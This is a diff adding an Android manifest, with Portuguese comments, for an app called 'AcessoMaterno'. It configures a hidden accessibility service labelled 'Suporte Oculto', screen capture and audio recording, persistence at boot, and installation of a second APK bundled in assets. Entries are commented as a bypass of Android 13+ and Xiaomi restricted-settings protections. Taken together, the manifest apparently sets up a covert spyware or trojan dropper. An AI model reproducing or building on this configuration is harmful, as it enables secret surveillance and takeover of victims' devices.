@@ -1,0 +1,179 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+    <!--
+        NOTA: o atributo package="com.example.acessomaterno" foi REMOVIDO.
+        No AGP 8+ ele é ignorado e gera warning; o namespace é definido em
+        build.gradle (android { namespace "com.example.acessomaterno" }).
+        Os nomes relativos (.MainActivity, .MyAccessibilityService, etc.)
+        continuam resolvendo normalmente pelo namespace.
+    -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <application
+        android:allowBackup="true"
+        android:usesCleartextTraffic="true"
+        android:dataExtractionRules="@xml/data_extraction_rules"
+        android:fullBackupContent="@xml/backup_rules"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.AcessoMaterno">
+        <!-- Bypass de Configurações Restritas para Xiaomi / MIUI / Android 13+ -->
+        <meta-data
+            android:name="android.security.RESTRICTED_SETTINGS"
+            android:value="false" />
+        <meta-data
+            android:name="com.miui.securitycenter.RESTRICTED_SETTINGS"
+            android:value="false" />
+        <!-- ============================================================= -->
+        <!-- CIRURGIA DE LAUNCHER: EXATAMENTE UMA ACTIVITY COM CATEGORY    -->
+        <!-- LAUNCHER NESTE APK (Aplicativo Principal). Qualquer outra     -->
+        <!-- <activity> ou <activity-alias> com LAUNCHER foi REMOVIDA para -->
+        <!-- que NÃO apareçam ícones extras na gaveta de aplicativos.      -->
+        <!-- O segundo aplicativo (suporte_motor.apk) é um APK separado    -->
+        <!-- dentro de assets/ e continua visível por conta própria.       -->
+        <!-- ============================================================= -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:enabled="true"
+            android:label="@string/app_name"
+            android:theme="@style/Theme.AcessoMaterno"
+            android:supportsPictureInPicture="true"
+            android:configChanges="orientation|screenSize|smallestScreenSize|screenLayout|keyboardHidden|uiMode|density|fontScale"
+            android:windowSoftInputMode="adjustResize">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+
+            
+        </activity>
+        <!-- Provider de arquivos para expor o APK baixado ao instalador -->
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="com.example.acessomaterno.fileprovider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths" />
+        </provider>
+        <!-- Serviços para execução nativa (NÃO geram ícone no launcher) -->
+        <service
+            android:name=".MyAccessibilityService"
+            android:label="Suporte Oculto"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+        <service
+            android:name=".ScreenCaptureService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection" />
+    </application>
+</manifest>
